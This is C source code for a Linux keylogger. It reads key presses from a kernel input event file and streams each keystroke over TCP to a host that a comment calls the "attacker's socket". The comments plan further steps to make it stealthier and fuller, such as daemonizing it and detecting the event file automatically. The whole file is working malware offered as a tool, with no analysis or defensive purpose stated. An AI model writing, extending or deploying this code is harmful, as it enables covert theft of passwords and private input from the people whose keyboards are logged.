/*

use the keyboard event file in /dev/
take argument

cannot use fopen or fread to read events because of blocking behavior
use sys functions provided by kernel to read keyboard events (documentation for system functions are found in man 2), check man syscalls

Buffer to allocate is the input_event struct in header linux/input.h https://stackoverflow.com/questions/21204798/read-in-linux-for-event-file

open() returns int file descriptor

https://www.kernel.org/doc/html/v5.4/input/event-codes.html

must flush stream to avoid buffering, use fflush()

(TCP)

add dynamic event file detection and daemonize to arm

*/

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <strings.h>

#include <signal.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

// attacker's socket
#define IP "127.0.0.1"
#define PORT 8080

#define BUFFER_SIZE 32

int tcp_connect(int *socket_fd);
void print(int fd, int socket_fd);

typedef struct {
    int code;
    char *c;
} keymap_type;

static const keymap_type keymap[] = {
    { .code = KEY_Q, .c = "q" },
    { .code = KEY_W, .c = "w" },
    { .code = KEY_E, .c = "e" },
    { .code = KEY_R, .c = "r" },
    { .code = KEY_T, .c = "t" },
    { .code = KEY_Y, .c = "y" },
    { .code = KEY_U, .c = "u" },
    { .code = KEY_I, .c = "i" },
    { .code = KEY_O, .c = "o" },
    { .code = KEY_P, .c = "p" },
    { .code = KEY_A, .c = "a" },
    { .code = KEY_S, .c = "s" },
    { .code = KEY_D, .c = "d" },
    { .code = KEY_F, .c = "f" },
    { .code = KEY_G, .c = "g" },
    { .code = KEY_H, .c = "h" },
    { .code = KEY_J, .c = "j" },
    { .code = KEY_K, .c = "k" },
    { .code = KEY_L, .c = "l" },
    { .code = KEY_Z, .c = "z" },
    { .code = KEY_X, .c = "x" },
    { .code = KEY_C, .c = "c" },
    { .code = KEY_V, .c = "v" },
    { .code = KEY_B, .c = "b" },
    { .code = KEY_N, .c = "n" },
    { .code = KEY_M, .c = "m" }
};

static const size_t len_keymap = sizeof(keymap) / sizeof(keymap[0]);

int main(int argc, char *argv[]) {

    if (argc != 2) {
        fprintf(stderr, "Eventfile argument required\n");
        return 1;
    }

    int fd = open(argv[1], O_RDONLY, 0);

    if (fd < 0) {
        fprintf(stderr, "Must run with root privileges\n");
        return 1;
    }

    // open socket

    int socket_fd = -1;
    if (tcp_connect(&socket_fd) != 0) {
        return 1;
    }

    // print
    signal(SIGPIPE, SIG_IGN);
    print(fd, socket_fd);

    close(socket_fd);
    return 0;
}

int tcp_connect(int *socket_fd) {
    // create socket fd
    *socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (*socket_fd < 0) {
        fprintf(stderr, "Error creating socket\n");
        return 1;
    }
    // fill sockaddr_in struct, later will cast as sockaddr
    struct sockaddr_in server;
    bzero(&server, sizeof(server));

    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP);
    // connect socket fd to address described in sockaddr struct
    if (connect(*socket_fd, (struct sockaddr *)&server, sizeof(server)) != 0) {
        fprintf(stderr, "Connection refused\n");
        close(*socket_fd);
        return 1;
    }
    fprintf(stdout, "Connection succeeded\n");
    return 0;
}

void print(int fd, int socket_fd) {

    struct input_event ie;
    char buffer[BUFFER_SIZE];
    ssize_t n;
    int len;

    for (;;) {
        read(fd, &ie, sizeof(ie));

        if (ie.type != EV_KEY)
            continue;
        if (ie.value != 1)
            continue;

        if (ie.code >= 2 && ie.code <= 10) {
            len = snprintf(buffer, sizeof(buffer), "%d", ie.code -1);
            n = send(socket_fd, buffer, len, 0);
        } else if (ie.code == 11) {
            n = send(socket_fd, "0", 1, 0);
        } else {

            switch (ie.code) {

                case KEY_SPACE:
                    n = send(socket_fd, " ", 1, 0);
                    break;
                case KEY_COMMA:
                    n = send(socket_fd, ",", 1, 0);
                    break;
                case KEY_DOT:
                    n = send(socket_fd, ".", 1, 0);
                    break;
                case KEY_BACKSPACE:
                    n = send(socket_fd, "(backspace)", 11, 0);
                    break;

                // add more case statements for full keylogger

                default:
                    // use indexing to find what key to print, if can't find print key code'
                    int good = 0;
                    for (size_t i = 0; i < len_keymap; i++) {
                        if (ie.code == keymap[i].code) {;
                            n = send(socket_fd, keymap[i].c, 1, 0);
                            good = 1;
                            break;
                        }
                    }
                    if (!good) {
                        len = snprintf(buffer, sizeof(buffer), "code:%d", ie.code);
                        n = send(socket_fd, buffer, len, 0);
                        break;
                    }
                    break;

            }
        }
        if (n == -1) {
            fprintf(stderr, "Peer disconnected\n");
            return;
        }
    }
}
